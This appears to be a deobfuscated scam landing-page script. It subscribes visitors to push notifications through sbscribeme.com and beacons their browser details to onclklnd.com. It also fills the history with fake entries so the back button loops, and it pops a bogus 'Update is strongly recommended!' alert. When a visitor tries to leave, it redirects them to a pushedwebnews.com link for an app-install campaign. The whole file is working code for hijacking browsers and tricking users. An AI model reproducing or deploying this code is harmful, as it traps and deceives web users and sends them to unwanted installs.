/**
 * @return {undefined}
 */
var pshr_init = function() {
  setTimeout(function() {
    registerPush({
      domain : "//sbscribeme.com",
      user : "552648880bfd300e0f568985c0d715aa",
      landId : "0nY9eHW6iVHyXIQ",
      swName : "pusherSW.js",
      version : "1.3"
    });
  }, +1 || 1);
};
(function() {
  if (typeof navigator !== "undefined" && typeof navigator.sendBeacon !== "undefined") {
    /**
     * @return {undefined}
     */
    var start = function() {
      navigator.sendBeacon("//onclklnd.com/1431028/1621482/", "Browser with BeaconAPI Support");
    }
  } else {
    var browser = function() {
      /** @type {string} */
      var ua = navigator.userAgent;
      var result;
      /** @type {Array} */
      var stack = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
      if (/trident/i.test(stack[1])) {
        /** @type {Array} */
        result = /\brv[ :]+(\d+)/g.exec(ua) || [];
        return{
          name : "IE",
          version : result[1] || ""
        };
      }
      if (stack[1] === "Chrome") {
        /** @type {(Array.<string>|null)} */
        result = ua.match(/\bOPR|Edge\/(\d+)/);
        if (result != null) {
          return{
            name : "Opera",
            version : result[1]
          };
        }
      }
      /** @type {Array} */
      stack = stack[2] ? [stack[1], stack[2]] : [navigator.appName, navigator.appVersion, "-?"];
      if ((result = ua.match(/version\/(\d+)/i)) != null) {
        stack.splice(1, 1, result[1]);
      }
      return{
        name : stack[0],
        version : stack[1]
      };
    }();
    if (!(browser.name === "Chrome" && browser.version > 39 || (browser.name === "Edge" || (browser.name === "Firefox" && browser.version > 31 || browser.name === "Opera" && browser.version > 26)))) {
      /**
       * @param {string} uri
       * @param {Event} file
       * @param {?} options
       * @return {?}
       */
      var request = function(uri, file, options) {
        var xhr = "XMLHttpRequest" in window ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP");
        xhr.open("POST", uri, false);
        /** @type {boolean} */
        xhr.withCredentials = true;
        xhr.setRequestHeader("Accept", "*/*");
        if (typeof file === "string") {
          xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
          /** @type {string} */
          xhr.responseType = "text/plain";
        } else {
          if (Object.prototype.toString.call(file) === "[object Blob]") {
            if (file.type) {
              xhr.setRequestHeader("Content-Type", file.type);
            }
          }
        }
        if (typeof options === "object") {
          if (!isNaN(options.timeout)) {
            setTimeout(function() {
              if (xhr.readyState !== 4) {
                xhr.abort();
              }
            }, options.timeout);
          }
        }
        xhr.send(file);
        return true;
      };
      /**
       * @return {undefined}
       */
      start = function() {
        request("//onclklnd.com/1431028/1621482/", "Browser without BeaconAPI Support: " + browser.name + " " + browser.version);
      };
    } else {
      /**
       * @return {?}
       */
      start = function() {
        return true;
      };
    }
  }
  /** @type {boolean} */
  var knocked = false;
  document.addEventListener("click", function(e) {
    if (!knocked) {
      if (e.target.tagName === "A" && e.target.getAttribute("href") === "//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US" ||
      e.target.getAttribute("data-href") === "//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US") {
        start();
        /** @type {boolean} */
        knocked = true;
      }
    }
  });
})();
(function(history, location, newState) {
  history.replaceState(null, newState.title, "?rzi=1431028&rsz=1431028&rid=");
})(history, location, document);
/** @type {string} */
var fakepath = document.URL;
window.history.pushState("index.php", "gogogo", fakepath);
window.history.pushState("index.php", "disone", fakepath);
window.addEventListener("popstate", function(dataAndEvents) {
  if (document.URL.indexOf(fakepath) >= 0) {
    window.history.pushState("index.php", "gogogo", fakepath);
    window.history.pushState("index.php", "disone", fakepath);
    if (document.getElementById("snd")) {
      document.getElementById("snd").play();
    }
    alert("Update is strongly recommended!");
  }
});
(function(win, doc) {
  /**
   * @return {undefined}
   */
  var init = function() {
    if (win.onbeforeunload === null) {
      var abortTimeout;
      /**
       * @return {undefined}
       */
      var setup = function() {
        /** @type {null} */
        win.onbeforeunload = null;
      };
      /**
       * @return {?}
       */
      var run = function() {
        /** @type {number} */
        abortTimeout = setTimeout(function() {
          win.location.replace("//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US");
          setup();
        }, 100);
        return "Update is strongly recommended!";
      };
      /** @type {function (): ?} */
      win.onbeforeunload = run;
      /** @type {NodeList} */
      var codeSegments = doc.querySelectorAll("[href='//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US'], [data-href='//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US']");
      /** @type {number} */
      i = 0;
      for (;i < codeSegments.length;++i) {
        codeSegments[i].addEventListener("click", function() {
          setup();
        });
      }
    }
  };
  if (doc.readyState != "loading") {
    init();
  } else {
    doc.addEventListener("DOMContentLoaded", init);
  }
})(window, document);
(function(win, doc) {
  /**
   * @return {undefined}
   */
  var init = function() {
    if (win.onbeforeunload === null) {
      var abortTimeout;
      /**
       * @return {undefined}
       */
      var setup = function() {
        /** @type {null} */
        win.onbeforeunload = null;
      };
      /**
       * @return {?}
       */
      var run = function() {
        /** @type {number} */
        abortTimeout = setTimeout(function() {
          win.location.replace("//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US");
          setup();
        }, 100);
        return "Update is strongly recommended!";
      };
      /** @type {function (): ?} */
      win.onbeforeunload = run;
      /** @type {NodeList} */
      var codeSegments = doc.querySelectorAll("[href='//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US'], [data-href='//pushedwebnews.com/?track=aHR0cHM6Ly9jb250cm9sLmtvY2hhdmEuY29tL3YxL2NwaS9jbGljaz9jYW1wYWlnbl9pZD1rb3BzYWZlLWRmbmRyLWFuZHJvaWQtcm55NjJlMzMzZDdlNjI0ZGEzJm5ldHdvcmtfaWQ9ODk4JmNsaWNrX2lkPTM5NjQwNDYyNzUyMiZkZXZpY2VfaWQ9ZGV2aWNlX2lkJnB1Ymxpc2hlcl9pZD0xNDMxMDI4JnNpdGVfaWQ9MTQzMTAyOCZhcHBlbmRfYXBwX2NvbnZfdHJrX3BhcmFtcz0x&meta-id=MTQwMjEw&z=1431028&brandSafe=0&rsz=1431028&svar=1510416005.3835&ssk=1e15bf6d038e9e0353269497b617095e&b=1621482&g=US']");
      /** @type {number} */
      i = 0;
      for (;i < codeSegments.length;++i) {
        codeSegments[i].addEventListener("click", function() {
          setup();
        });
      }
    }
  };
  if (doc.readyState != "loading") {
    init();
  } else {
    doc.addEventListener("DOMContentLoaded", init);
  }
})(window, document);
